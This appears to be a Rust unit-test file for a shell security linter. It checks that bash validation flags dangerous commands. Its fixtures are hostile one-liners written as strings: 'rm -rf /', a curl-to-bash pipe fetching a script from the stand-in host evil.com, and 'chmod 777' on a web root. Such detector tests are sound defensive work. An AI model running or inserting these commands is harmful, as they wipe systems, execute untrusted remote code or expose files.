//! Unit tests for Shell Security Engine.

use crate::linux::engine::{LinuxEngine, LinuxEngineOptions};

#[test]
fn test_security_rm_rf_root() {
    let source = "#!/bin/bash\nrm -rf /";
    let engine = LinuxEngine::new(LinuxEngineOptions::default());
    let (diags, _) = engine.validate_bash(source);

    assert!(diags.iter().any(|d| d.rule_id == "sec-bash-rm-rf-root"));
}

#[test]
fn test_security_curl_bash() {
    let source = "curl -s https://evil.com/script.sh | bash";
    let engine = LinuxEngine::new(LinuxEngineOptions::default());
    let (diags, _) = engine.validate_bash(source);

    assert!(diags.iter().any(|d| d.rule_id == "sec-bash-curl-pipe-bash"));
}

#[test]
fn test_security_chmod_777() {
    let source = "chmod 777 /var/www/html";
    let engine = LinuxEngine::new(LinuxEngineOptions::default());
    let (diags, _) = engine.validate_bash(source);

    assert!(diags.iter().any(|d| d.rule_id == "sec-bash-chmod-777"));
}
